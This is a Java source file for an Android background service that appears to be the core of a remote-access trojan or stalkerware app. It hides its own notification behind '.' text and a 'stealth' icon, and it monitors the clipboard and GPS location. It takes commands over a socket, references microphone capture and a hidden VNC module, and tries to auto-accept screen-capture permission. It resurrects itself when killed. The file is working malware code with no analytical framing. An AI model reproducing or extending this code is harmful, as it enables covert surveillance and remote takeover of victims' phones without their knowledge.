package com.fason.app.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.Manifest;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.fason.app.R;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.SocketCommandRouter;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.location.GpsManager;
import com.fason.app.receiver.WatchdogReceiver;
import com.fason.app.persistence.AlarmEngine;

public class MainService extends Service {
    public static final int NOTIF_ID = 1;
    private static final long WATCHDOG_INTERVAL_MS = 5 * 60 * 1000L;
    private static final long WAKE_LOCK_TIMEOUT_MS = 60 * 1000L;
    public static final int SCREEN_CAPTURE_REQUEST_CODE = 7777;
    private static volatile MainService instance;
    private static volatile PowerManager.WakeLock wakeLock;
    private static volatile int restartCount = 0;
    private ClipboardMonitor clipMonitor;
    private GpsManager locManager;
    private volatile int currentType = 0;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static MainService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        restartCount = 0;
        try {
            createChannel();
        } catch (Exception ignored) {}
        startForeground();
        acquireWakeLock();
        WatchdogReceiver.setServiceActive(this, true);
        clipMonitor = ClipboardMonitor.getInstance(this);
        clipMonitor.start();
        try {
            locManager = new GpsManager(this);
        } catch (Exception ignored) {}
        SocketClient.reset();
        SocketCommandRouter.initialize();
        scheduleWatchdog();
        registerScreenStateReceiver();
        instance = this;
    }

    private android.content.BroadcastReceiver screenStateReceiver;

    private void registerScreenStateReceiver() {
        try {
            screenStateReceiver = new com.fason.app.receiver.ScreenStateReceiver();
            android.content.IntentFilter filter = new android.content.IntentFilter();
            filter.addAction(android.content.Intent.ACTION_SCREEN_ON);
            filter.addAction(android.content.Intent.ACTION_SCREEN_OFF);
            filter.addAction(android.content.Intent.ACTION_USER_PRESENT);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenStateReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(screenStateReceiver, filter);
            }
            Log.i("MainService", "Screen receiver registered");
        } catch (Exception e) {
            Log.w("MainService", "Failed to register ScreenStateReceiver", e);
        }
    }

    private void unregisterScreenStateReceiver() {
        if (screenStateReceiver != null) {
            try { unregisterReceiver(screenStateReceiver); } catch (Exception ignored) {}
            screenStateReceiver = null;
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;
        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
        if (existing != null) return;
        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(".");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setBypassDnd(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ch.setAllowBubbles(false);
        }
        nm.createNotificationChannel(ch);
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            currentType = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
            try {
                startForeground(NOTIF_ID, buildNotification(), currentType);
            } catch (RuntimeException | LinkageError e) {
                Log.w("MainService", "startForeground failed, fallback", e);
                startForeground(NOTIF_ID, buildNotification());
            }
        } else {
            startForeground(NOTIF_ID, buildNotification());
        }
    }

    public void upgradeForMediaProjection() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return;
        try {
            int newType = currentType | ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            if (newType != currentType) {
                currentType = newType;
                startForeground(NOTIF_ID, buildNotification(), currentType);
                Log.i("MainService", "FGS upgraded for projection: " + currentType);
            }
        } catch (RuntimeException | LinkageError e) {
            Log.e("MainService", "FGS upgrade failed", e);
        }
    }

    public void downgradeFromMediaProjection() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return;
        try {
            int newType = currentType & ~ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            if (newType != currentType) {
                if (newType == 0) newType = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
                currentType = newType;
                startForeground(NOTIF_ID, buildNotification(), currentType);
            }
        } catch (RuntimeException | LinkageError ignored) {}
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentTitle(".")
            .setContentText(".")
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setGroupSummary(true)
            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();
    }

    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK, "fason::service");
                wakeLock.setReferenceCounted(false);
            }
        }
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(WAKE_LOCK_TIMEOUT_MS);
        }
    }

    public synchronized void updateType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if ((type & ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION) != 0) {
                boolean locGranted =
                    checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                        == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                        == android.content.pm.PackageManager.PERMISSION_GRANTED;
                if (!locGranted) {
                    Log.w("MainService", "Skipping LOCATION FGS, no permission");
                    type &= ~ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                    if (type == 0) return;
                }
            }
            int combined = currentType | type;
            if (combined != currentType) {
                currentType = combined;
                try {
                    startForeground(NOTIF_ID, buildNotification(), currentType);
                } catch (RuntimeException | LinkageError ignored) {
                    Log.w("MainService", "updateType failed for " + type, ignored);
                }
            }
        }
    }

    public synchronized void releaseType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            int remaining = currentType & ~type;
            if (remaining != currentType) {
                if (remaining == 0) remaining = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
                currentType = remaining;
                try {
                    startForeground(NOTIF_ID, buildNotification(), currentType);
                } catch (RuntimeException | LinkageError ignored) {
                    Log.w("MainService", "releaseType failed for " + type, ignored);
                }
            }
        }
    }

    private void scheduleWatchdog() {
        AlarmEngine.scheduleWatchdog();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(WAKE_LOCK_TIMEOUT_MS);
        }
        scheduleWatchdog();
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    @Override
    public void onDestroy() {
        // Layer 7: Self-resurrection
        try {
            Log.w("MainService", "Service destroyed — attempting self-resurrection");
            Intent intent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            AlarmEngine.scheduleHeartbeat();
        } catch (Exception ignored) {}
        try {
            com.fason.app.features.mic.MicManager.stop(null);
        } catch (Exception ignored) {}
        try {
            com.fason.app.features.hvnc.HVncManager.getInstance().stop();
        } catch (Exception ignored) {}
        unregisterScreenStateReceiver();
        if (clipMonitor != null) clipMonitor.shutdown();
        if (locManager != null) locManager.stop();
        SocketCommandRouter.shutdown();
        SocketClient socketClient = SocketClient.getInstance();
        if (socketClient != null) {
            socketClient.shutdown();
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        WatchdogReceiver.setServiceActive(this, false);
        instance = null;
        scheduleRestart();
        super.onDestroy();
    }

    private void scheduleRestart() {
        long delay = Math.min(2 * 60 * 1000L, 2000L * (1L << Math.min(restartCount, 6)));
        restartCount++;
        scheduleAlarm(Protocol.BC_RESPAWN_SERVICE, 0, delay);
    }

    private void scheduleAlarm(String action, int requestCode, long delayMs) {
        try {
            Intent i = new Intent(this, WatchdogReceiver.class);
            i.setAction(action);
            int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(this, requestCode, i, flags);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            long trigger = SystemClock.elapsedRealtime() + delayMs;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            } else {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception ignored) {}
    }

    public GpsManager getGpsManager() {
        return locManager;
    }

    public void requestScreenCapturePermission() {
        try {
            android.content.Intent proxyIntent = new android.content.Intent(this, com.fason.app.ui.ScreenCaptureProxyActivity.class);
            proxyIntent.addFlags(
                android.content.Intent.FLAG_ACTIVITY_NEW_TASK |
                android.content.Intent.FLAG_ACTIVITY_MULTIPLE_TASK |
                android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION
            );
            startActivity(proxyIntent);
        } catch (Exception e) {
            Log.e("MainService", "Failed to launch ScreenCaptureProxyActivity", e);
            try {
                com.fason.app.features.hvnc.HVncManager.getInstance()
                    .onAutoAcceptResult(false, "proxy_activity_launch_failed");
            } catch (Exception ignored) {}
        }
    }
}
